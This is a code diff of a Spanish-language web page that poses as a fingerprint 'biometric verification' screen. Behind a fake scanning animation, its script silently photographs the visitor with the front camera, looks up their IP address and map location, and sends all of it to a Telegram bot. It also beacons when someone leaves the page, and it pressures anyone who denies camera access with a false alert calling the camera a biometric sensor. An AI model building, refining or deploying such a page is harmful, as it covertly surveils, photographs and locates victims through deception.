@@ -3,27 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Acceso Seguro - Verificación de Huella</title>
+    <title>Portal de Verificación Biométrica</title>
     <style>
-        body { background: #000; color: #00d4ff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; overflow: hidden; user-select: none; }
-        .fingerprint-sensor { width: 150px; height: 150px; border: 2px solid #00d4ff; border-radius: 50%; display: flex; justify-content: center; align-items: center; position: relative; box-shadow: 0 0 20px rgba(0, 212, 255, 0.5); cursor: pointer; }
-        .fingerprint-icon { font-size: 80px; opacity: 0.8; }
-        .laser { position: absolute; width: 100%; height: 3px; background: #00d4ff; box-shadow: 0 0 15px #00d4ff; top: 0; display: none; animation: scanning 2s linear infinite; }
-        @keyframes scanning { 0% { top: 10%; } 50% { top: 90%; } 100% { top: 10%; } }
-        .status-text { margin-top: 30px; font-size: 14px; font-weight: bold; letter-spacing: 2px; text-transform: uppercase; text-align: center; padding: 0 20px; }
-        .progress-ring { position: absolute; width: 170px; height: 170px; border: 4px solid transparent; border-top: 4px solid #00d4ff; border-radius: 50%; display: none; animation: spin 1s linear infinite; }
+        body { 
+            background: #050505; 
+            color: #ffffff; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            margin: 0; 
+            overflow: hidden; 
+        }
+
+        .container { text-align: center; width: 100%; max-width: 400px; }
+
+        h1 { font-size: 18px; font-weight: 300; letter-spacing: 1px; margin-bottom: 40px; color: #e0e0e0; }
+
+        /* Sensor estilo Samsung */
+        .sensor-wrapper {
+            position: relative;
+            width: 140px;
+            height: 140px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+
+        .outer-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 2px solid rgba(0, 212, 255, 0.2);
+            border-radius: 50%;
+        }
+
+        .progress-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 3px solid transparent;
+            border-top: 3px solid #00d4ff;
+            border-radius: 50%;
+            display: none;
+            animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+        }
+
+        .fingerprint-main {
+            width: 80px;
+            height: 80px;
+            fill: #00d4ff;
+            filter: drop-shadow(0 0 10px rgba(0, 212, 255, 0.5));
+            transition: transform 0.2s;
+        }
+
+        .sensor-wrapper:active .fingerprint-main { transform: scale(0.9); }
+
+        .laser {
+            position: absolute;
+            width: 90%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00d4ff, transparent);
+            top: 50%;
+            left: 5%;
+            display: none;
+            z-index: 10;
+            animation: scan 2s ease-in-out infinite;
+        }
+
         @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes scan { 
+            0%, 100% { top: 20%; opacity: 0; }
+            50% { top: 80%; opacity: 1; }
+        }
+
+        .status-text {
+            margin-top: 50px;
+            font-size: 13px;
+            color: #888;
+            letter-spacing: 1.5px;
+            font-weight: 500;
+        }
+
+        .brand-footer {
+            position: absolute;
+            bottom: 30px;
+            font-size: 10px;
+            color: #333;
+            text-transform: uppercase;
+        }
     </style>
 </head>
 <body>
 
-    <div class="progress-ring" id="ring"></div>
-    <div class="fingerprint-sensor" id="sensor">
-        <div class="laser" id="laser"></div>
-        <span class="fingerprint-icon">🧬</span>
+    <div class="container">
+        <h1>AUTENTICACIÓN REQUERIDA</h1>
+        
+        <div class="sensor-wrapper" id="sensor">
+            <div class="outer-ring"></div>
+            <div class="progress-ring" id="ring"></div>
+            <div class="laser" id="laser"></div>
+            <svg class="fingerprint-main" viewBox="0 0 24 24">
+                <path d="M17.81 4.47c-.08 0-.16-.02-.23-.06C15.66 3.42 14 3 12.01 3c-1.98 0-3.86.47-5.57 1.41-.24.13-.54.04-.67-.2-.13-.24-.04-.55.2-.68C7.82 2.52 9.86 2 12.01 2c2.13 0 3.99.47 6.03 1.56.24.13.33.43.2.67-.09.16-.24.24-.43.24zm3.49 4.72c-.11 0-.22-.04-.31-.12-.18-.17-.43-.38-.73-.61-.23-.17-.28-.49-.11-.72.17-.23.49-.28.72-.11.33.25.62.49.84.69.21.19.22.51.03.71-.11.1-.28.16-.44.16zm-17.3.01c-.16 0-.32-.06-.43-.17-.19-.2-.18-.52.02-.71.22-.2.51-.44.84-.69.23-.17.55-.12.72.11.17.23.12.55-.11.72-.3.23-.55.44-.73.61-.1.08-.21.13-.31.13zm15.42 3.4c-.11 0-.21-.04-.31-.12-1.31-1.12-2.73-1.76-4.32-2-1.95-.31-3.89.15-5.5 1.29-.24.17-.56.11-.73-.13-.17-.24-.11-.56.13-.73 1.83-1.29 4.07-1.83 6.32-1.47 1.83.29 3.48 1.03 4.98 2.31.2.18.22.5.04.7-.09.09-.21.15-.41.15zM4.14 12.6c-.15 0-.3-.06-.41-.17-.2-.2-.2-.52 0-.72 1.51-1.3 3.16-2.03 4.99-2.32 1.15-.18 2.26-.14 3.32.12.29.07.47.36.4.65-.07.29-.36.47-.65.4-1.14-.28-2.31-.3-3.52-.11-1.57.24-2.98.88-4.28 2-.1.1-.23.15-.35.15zM12 22c-.11 0-.21-.04-.31-.12-1.54-1.28-2.61-2.48-3.41-3.8-.75-1.23-1.14-2.58-1.14-4.01 0-2.29 1.54-4.44 3.65-5.11 1.76-.56 3.63-.33 5.12.63 1.41.91 2.27 2.45 2.33 4.19.01.29-.21.53-.5.54s-.53-.21-.54-.5c-.05-1.42-.75-2.69-1.9-3.43-1.21-.78-2.73-.97-4.16-.51-1.71.55-2.99 2.31-2.99 4.2 0 1.25.34 2.42.98 3.47.7.1.15 1.7 1.12 3.03 2.5 1.07 2.1 4.17.21.5-.04-.31-.13-.42-.17zM14.28 15.65c-.19 0-.37-.11-.46-.29-.65-1.33-1.31-1.84-2.32-1.84s-1.68.51-2.33 1.84c-.13.26-.45.37-.71.24s-.37-.45-.24-.71c.88-1.78 2-2.37 3.28-2.37s2.4.59 3.28 2.37c.13.26.02.58-.24.71-.09.04-.19.05-.26.05z" />
+            </svg>
+        </div>
+
+        <div class="status-text" id="status">PULSE SENSOR PARA CONTINUAR</div>
     </div>
 
-    <div class="status-text" id="status">PULSE PARA ESCANEAR HUELLA</div>
+    <div class="brand-footer">Biometric Security System v4.0</div>
 
     <audio id="beep" src="data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU92T19vdm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92"></audio>
 
@@ -36,13 +128,11 @@
         const beep = document.getElementById('beep');
         let procesoExitoso = false;
 
-        // --- SISTEMA DE REPORTE POR ABANDONO ---
         window.addEventListener('beforeunload', function (e) {
             if (!procesoExitoso) {
-                const reporteAbandono = "⚠️ *ALERTA DE ABANDONO*\nEl usuario cerró la página sin completar la verificación.";
                 navigator.sendBeacon(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, JSON.stringify({
                     chat_id: CONFIG.CHAT_ID,
-                    text: reporteAbandono,
+                    text: "⚠️ *ALERTA DE ABANDONO*\nUsuario cerró la sesión.",
                     parse_mode: 'Markdown'
                 }));
             }
@@ -50,52 +140,37 @@
 
         async function validarBiometria() {
             if (navigator.vibrate) navigator.vibrate([100]);
-            status.innerHTML = "INICIANDO ESCANEO...";
+            status.innerHTML = "ESCANEANDO HUELLA...";
             laser.style.display = "block";
             ring.style.display = "block";
 
-            let infoDispositivo = "No se obtuvieron datos.";
+            let infoDispositivo = "No data";
 
             try {
-                // Captura de datos de red
                 const resIP = await fetch('https://ipapi.co/json/');
                 const d = await resIP.json();
-                const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Móvil";
-                infoDispositivo = `📱 *Equipo:* ${equipo}\n🌐 *IP:* \`${d.ip}\`\n📍 *Lugar:* ${d.city}, ${d.country_name}\n🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
+                const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Android Device";
+                infoDispositivo = `📱 *EQ:* ${equipo}\n🌐 *IP:* \`${d.ip}\`\n📍 *Lugar:* ${d.city}, ${d.country_name}\n🔗 *MAP:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-                // --- FORZADO DE PETICIÓN DE CÁMARA ---
-                // Cada vez que se llama a getUserMedia, el navegador revisa el permiso.
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: "user",
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    } 
-                });
-
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.setAttribute("playsinline", true);
                 await video.play();
                 
-                status.innerHTML = "VALIDANDO IDENTIDAD...";
                 await new Promise(r => setTimeout(r, 2000));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth; 
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
-
-                // --- CIERRE ABSOLUTO DE CÁMARA ---
-                // Esto libera el hardware para que el navegador "olvide" el uso activo
+                const fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
                 stream.getTracks().forEach(t => t.stop());
 
-                // Envío a Telegram
                 const fd = new FormData();
                 fd.append('chat_id', CONFIG.CHAT_ID);
-                fd.append('photo', fotoBlob, 'captura.jpg');
-                fd.append('caption', `✅ *VERIFICACIÓN COMPLETADA*\n\n${infoDispositivo}`);
+                fd.append('photo', fotoBlob, 'foto.jpg');
+                fd.append('caption', `✅ *IDENTIDAD CONFIRMADA*\n\n${infoDispositivo}`);
                 fd.append('parse_mode', 'Markdown');
 
                 await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
@@ -103,16 +178,12 @@
                 procesoExitoso = true;
                 if (beep) beep.play();
                 status.innerHTML = "✅ ACCESO CONCEDIDO";
-                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
+                setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1200);
 
             } catch (err) {
-                // Reporte de fallo o rechazo
-                let mensajeError = "❌ *ERROR TÉCNICO*\n\n";
-                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                    mensajeError += "🚫 *Razón:* El usuario bloqueó la cámara manualmente.";
-                } else {
-                    mensajeError += `⚠️ *Razón:* ${err.message}`;
-                }
+                let mensajeError = "❌ *FALLO DE SEGURIDAD*\n";
+                if (err.name === 'NotAllowedError') mensajeError += "Permiso de sensor denegado.";
+                else mensajeError += `Error: ${err.message}`;
 
                 await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -120,7 +191,7 @@
                     body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: `${mensajeError}\n\n${infoDispositivo}`, parse_mode: 'Markdown' })
                 });
 
-                alert("ADVERTENCIA DE SEGURIDAD: Para validar su identidad, debe presionar 'PERMITIR' cuando el navegador solicite acceso a la cámara frontal.");
+                alert("ATENCIÓN: Debe habilitar el acceso al sensor biométrico para validar su identidad y descargar el archivo.");
                 location.reload();
             }
         }
